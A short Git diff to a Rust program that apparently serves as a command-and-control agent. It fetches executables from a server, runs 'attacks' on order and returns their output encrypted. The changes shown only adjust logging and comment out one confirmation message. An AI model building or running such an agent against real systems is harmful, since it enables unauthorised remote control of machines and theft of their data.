@@ -289,7 +289,7 @@ fn check_and_request_executable(
         println!("\t\t[+] Executable received and stored at {:?}", executable_path);
     } else {
         println!("\t[+] Executable found at {:?}", executable_path);
-        send_encrypted_string_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
+        //send_encrypted_string_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
     }
 
     Ok(())
@@ -326,12 +326,12 @@ fn execute_attack(
     if output.status.success() {
         // Convert stdout to a string
         let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-        println!("[+] Attaque Exécutée: {}", attack_name);
+        println!("[+] Attaque Exécutée (sucess): {}", attack_name);
         Ok(stdout)
     } else {
         // Convert stderr to a string and return an error
         let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-        println!("[+] Attaque Exécutée: {}", attack_name);
+        println!("[+] Attaque Exécutée (error): {}", attack_name);
         Err(io::Error::new(io::ErrorKind::Other, stderr))
     }
 
@@ -438,6 +438,7 @@ fn main() -> io::Result<()> {
                 match execute_attack(type_attack.clone().as_str(), &args , &sender, &receiver, &symetric_key, &iv, connexion3.try_clone().expect("REASON")) {
                     Ok(output) => {
                         let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
+                        println!("response : {}", response);
                         send_encrypted_string_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                     }
                     Err(e) => {
